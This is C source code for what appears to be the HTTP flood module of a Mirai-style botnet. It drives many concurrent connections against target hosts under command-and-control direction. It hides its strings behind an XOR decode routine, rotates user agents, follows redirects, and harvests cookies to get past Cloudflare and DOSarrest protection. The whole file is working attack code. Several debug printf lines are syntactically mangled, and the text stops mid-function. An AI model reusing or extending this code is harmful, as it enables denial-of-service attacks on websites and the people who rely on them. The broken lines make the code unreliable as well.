#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "table.h"
#include "util.h"

void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{

}


void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4));
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, (char*)util_decrypt("\x25\x0A", 2));
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char generic_memes[10241] = {0};

    if (domain == NULL || path == NULL)
        return;

    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (util_strlen(method) > 9)
        return;

    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
    // yes it would segfault but we only update the values if they are not already uppercase.
    // if the method is lowercase and its passed from the CNC we can update that memory no problem
    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    // unlock frequently used strings
    table_unlock_val(TABLE_ATK_SET_COOKIE);
    table_unlock_val(TABLE_ATK_REFRESH_HDR);
    table_unlock_val(TABLE_ATK_LOCATION_HDR);
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
    table_unlock_val(TABLE_ATK_CHUNKED);
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);
    table_unlock_val(TABLE_ATK_DOSARREST);
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

    http_table = calloc(sockets, sizeof(struct attack_http_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].path, path);

        if (http_table[i].path[0] != '/')
        {
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';
        }

        util_strcpy(http_table[i].orig_method, method);
        util_strcpy(http_table[i].method, method);

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }

        util_strcpy(http_table[i].path, path);
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_http_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x6C\x6E\x2F\x6E\x2A\x79\x7E\x6B\x78\x7E\x6F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x00\x0A", 35), conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x59\x6F\x64\x6E\x63\x64\x6D\x2A\x62\x7E\x7E\x7A\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x00\x0A", 35));
#endif

                char buf[10240];
                util_zero(buf, 10240);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 24));
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x42\x65\x79\x7E\x30\x2A\x0A", 9));
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                }

                if (conn->num_cookies > 0)
                {
                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x49\x65\x65\x61\x63\x6F\x30\x2A\x0A", 9));
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x31\x2A\x0A", 3));
                    }
                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                }

                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf((char*)util_decrypt("\x79\x6F\x64\x6E\x63\x64\x6D\x2A\x68\x7F\x6C\x30\x2A\x56\x0A", 15)%s\(char*)util_decrypt("\x00\x0A", 2), buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x6F\x6E\x24\x00\x0A", 30), conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x6F\x78\x78\x65\x78\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x37\x2A\x2F\x6E\x00\x0A", 47), conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }


                    // we want to process a full http header (^:
                    if (util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4)] = 0;

#ifdef DEBUG
                    if (sockets == 1)
                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x62\x6F\x6B\x6E\x6F\x78\x79\x30\x2A\x56\x0A", 24)%s\(char*)util_decrypt("\x00\x0A", 2), generic_memes);
#endif

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x31\x0A", 2), 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x31\x0A", 2), 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    // this will still work as previous handlers will only add in null chars or similar
                    // and we specify the size of the string to stristr
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            if (util_memsearch(loc_ptr, nl_off, (char*)util_decrypt("\x62\x7E\x7E\x7A\x0A", 5), 4) == 4)
                            {
                                //this is an absolute url, domain name change maybe?
                                ii = 7;
                                //http(s)
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;
                                        break;
                                    }
                                    ii++;
                                }

                                // domain: loc_ptr;
                                // path: &(loc_ptr[ii + 1]);

                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                //handle relative url
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), (char*)util_decrypt("\x7F\x78\x66\x37\x0A", 5)) != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), (char*)util_decrypt("\x7F\x78\x66\x37\x0A", 5));

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    //yes its ugly, but i dont care
                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                //YOLO LOL
                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), (char*)util_decrypt("\x62\x7E\x7E\x7A\x0A", 5)) == 4)
                                {
                                    //this is an absolute url, domain name change maybe?
                                    ii = 7;
                                    //http(s)
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }

                                    // domain: loc_ptr;
                                    // path: &(loc_ptr[ii + 1]);

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {
                                    //handle relative url
                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4));
                                // queue the state up for the next time
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    // actually pull the content from the buffer that we processed via MSG_PEEK
                    processed = util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4);

                    if (util_strcmp(conn->method, (char*)util_decrypt("\x5A\x45\x59\x5E\x0A", 5)) || util_strcmp(conn->method, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4)))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    while (TRUE)
                    {
                        // spooky doods changed state
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x6D\x78\x6B\x69\x6F\x6C\x7F\x66\x66\x73\x2A\x69\x66\x65\x79\x6F\x6E\x00\x0A", 48), conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x66\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x00\x0A", 35), conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    // we specifically want this to be case sensitive
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, (char*)util_decrypt("\x2D\x0A", 2), 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), (char*)util_decrypt("\x37\x0A", 2));

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, (char*)util_decrypt("\x2D\x0A", 2), 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (conn->content_length == 0)
                            {
                                if (conn->chunked == 1)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, (char*)util_decrypt("\x07\x00\x0A", 3), 2) != -1)
                                    {
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, (char*)util_decrypt("\x31\x0A", 2), 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, (char*)util_decrypt("\x31\x0A", 2), 1)] = 0;

                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    // get rid of any extra in the buf before we move on...
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (consumed == 0)
                                break;
                            else
                            {
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    while(TRUE)
                    {
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
